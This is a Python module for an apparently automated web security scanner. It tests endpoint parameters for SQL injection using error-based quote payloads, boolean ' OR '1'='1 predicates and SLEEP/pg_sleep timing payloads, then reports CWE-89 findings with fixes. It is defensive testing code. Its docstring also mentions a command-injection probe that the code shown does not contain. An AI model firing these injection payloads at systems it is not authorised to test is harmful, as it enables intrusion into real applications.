"""Injector — active injection testing, starting with SQL injection.

Three complementary SQLi techniques per parameter:
  * error-based   — inject a quote, look for database error signatures
  * boolean-based — compare a true vs false predicate response
  * time-based    — inject a sleep and measure the response delay
Also a light command-injection time probe. Designed to be safe and bounded: it
only touches the target it was pointed at, with capped payloads and concurrency.
"""

from __future__ import annotations

import re
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from argus.agents.base import AgentReport, AttackContext, BaseAgent, Endpoint, build_http_poc
from argus.models import Finding, Severity

# Database error signatures (error-based SQLi).
_SQL_ERRORS = re.compile(
    r"(SQL syntax.*MySQL|valid MySQL result|PostgreSQL.*ERROR|pg_query\(\)|"
    r"SQLite/JDBCDriver|sqlite3\.|SQLITE_ERROR|near \".*\": syntax error|"
    r"Unclosed quotation mark|quoted string not properly terminated|"
    r"ORA-[0-9]{5}|Microsoft OLE DB Provider for SQL Server|"
    r"Warning.*\Wmysqli?_|System\.Data\.SqlClient\.SqlException)",
    re.IGNORECASE,
)

_ERROR_PAYLOADS = ["'", '"', "')", "';"]
_BOOL_TRUE = "' OR '1'='1"
_BOOL_FALSE = "' AND '1'='2"
# Time-based: ~3s sleep across common engines.
_TIME_PAYLOADS = [
    "1' AND SLEEP(3)-- -",          # MySQL
    "1'; SELECT pg_sleep(3)-- -",   # PostgreSQL
    "1' AND 1=(SELECT 1 FROM PG_SLEEP(3))-- -",
]
_TIME_THRESHOLD = 2.5

# Common parameter names to try when an endpoint exposes none.
_GUESS_PARAMS = ["id", "q", "search", "name", "user", "query", "page", "category"]


def _with_param(url: str, param: str, value: str, base_params: dict | None = None) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    if base_params:
        qs.update({k: [v] for k, v in base_params.items()})
    qs[param] = [value]
    new_q = urlencode({k: v[0] for k, v in qs.items()})
    return urlunparse(parsed._replace(query=new_q))


class Injector(BaseAgent):
    name = "Injector"
    description = "SQL & command injection"

    async def run(self, ctx: AttackContext) -> AgentReport:
        report = AgentReport(agent=self.name, status="running")
        targets = self._targets(ctx)
        if not targets:
            ctx.emit(self.name, "no injectable parameters discovered")
            report.status = "complete"
            return report

        seen_vuln: set[str] = set()
        for ep, param in targets:
            sig = f"{ep.url}::{param}"
            if sig in seen_vuln:
                continue
            ctx.emit(self.name, f"testing {param} on {self._short(ep.url)} …")

            if await self._error_based(ctx, ep, param):
                seen_vuln.add(sig)
                continue
            if await self._time_based(ctx, ep, param):
                seen_vuln.add(sig)
                continue
            await self._boolean_based(ctx, ep, param, seen_vuln, sig)

        report.requests_sent = ctx.requests_sent
        report.findings = len([f for f in ctx.findings if f.detector.startswith("injector")])
        report.status = "complete"
        ctx.emit(self.name, f"sweep complete — {len(seen_vuln)} confirmed", "ok")
        return report

    # ------------------------------------------------------------------ #
    def _targets(self, ctx: AttackContext) -> list[tuple[Endpoint, str]]:
        out: list[tuple[Endpoint, str]] = []
        for ep in ctx.endpoint_list():
            if ep.method not in ("GET", "POST"):
                continue
            params = ep.params or _GUESS_PARAMS[:4]
            for p in params:
                out.append((ep, p))
        return out[:80]  # bound total work

    async def _error_based(self, ctx: AttackContext, ep: Endpoint, param: str) -> bool:
        for payload in _ERROR_PAYLOADS:
            url = _with_param(ep.url, param, "1" + payload)
            resp = await self.get(ctx, url)
            if resp is None:
                continue
            if _SQL_ERRORS.search(resp.text or ""):
                m = _SQL_ERRORS.search(resp.text or "")
                ctx.report(Finding(
                    title="SQL injection (error-based)",
                    severity=Severity.CRITICAL,
                    category="injection",
                    detector="injector:sqli-error",
                    endpoint=f"{ep.method} {ep.url}",
                    evidence=f"param '{param}' payload {payload!r} -> DB error: {m.group(0)[:80]}",
                    description=f"Injecting into '{param}' produced a database error, proving "
                                f"unsanitised input reaches the SQL engine.",
                    exploit=f"An attacker can extract or modify data via {param}, e.g. "
                            f"UNION-based extraction or boolean/time blind exfiltration.",
                    fix="Use parameterised queries / prepared statements for this parameter.",
                    cwe="CWE-89",
                    cvss=9.8,
                    confidence="high",
                    poc=build_http_poc(ep.method, url, resp),
                ))
                return True
        return False

    async def _time_based(self, ctx: AttackContext, ep: Endpoint, param: str) -> bool:
        # baseline timing
        base_url = _with_param(ep.url, param, "1")
        _, base_t = await self.timed_request(ctx, ep.method, base_url)
        for payload in _TIME_PAYLOADS:
            url = _with_param(ep.url, param, payload)
            resp, elapsed = await self.timed_request(ctx, ep.method, url)
            if resp is not None and elapsed - base_t >= _TIME_THRESHOLD:
                # confirm with a second shot to reduce noise
                _, confirm_t = await self.timed_request(ctx, ep.method, url)
                if confirm_t - base_t >= _TIME_THRESHOLD:
                    ctx.report(Finding(
                        title="SQL injection (time-based blind)",
                        severity=Severity.CRITICAL,
                        category="injection",
                        detector="injector:sqli-time",
                        endpoint=f"{ep.method} {ep.url}",
                        evidence=f"param '{param}': baseline {base_t:.2f}s vs sleep {elapsed:.2f}s",
                        description=f"A sleep payload in '{param}' delayed the response, confirming "
                                    f"blind SQL injection.",
                        exploit="Blind boolean/time exfiltration of arbitrary data.",
                        fix="Use parameterised queries for this parameter.",
                        cwe="CWE-89",
                        cvss=9.8,
                        confidence="high",
                    ))
                    return True
        return False

    async def _boolean_based(
        self, ctx: AttackContext, ep: Endpoint, param: str, seen: set[str], sig: str
    ) -> None:
        t = await self.get(ctx, _with_param(ep.url, param, "1" + _BOOL_TRUE))
        f = await self.get(ctx, _with_param(ep.url, param, "1" + _BOOL_FALSE))
        if t is None or f is None:
            return
        if t.status_code == f.status_code and abs(len(t.text or "") - len(f.text or "")) > 60:
            seen.add(sig)
            ctx.report(Finding(
                title="SQL injection (boolean-based blind)",
                severity=Severity.HIGH,
                category="injection",
                detector="injector:sqli-bool",
                endpoint=f"{ep.method} {ep.url}",
                evidence=f"param '{param}': TRUE len {len(t.text or '')} vs FALSE len {len(f.text or '')}",
                description=f"True and false SQL predicates in '{param}' yield different responses, "
                            f"indicating boolean-based blind SQL injection.",
                exploit="Bit-by-bit data exfiltration via boolean conditions.",
                fix="Use parameterised queries for this parameter.",
                cwe="CWE-89",
                cvss=8.6,
                confidence="medium",
            ))

    @staticmethod
    def _short(url: str) -> str:
        p = urlparse(url)
        return (p.path or "/") + ("?" + p.query if p.query else "")
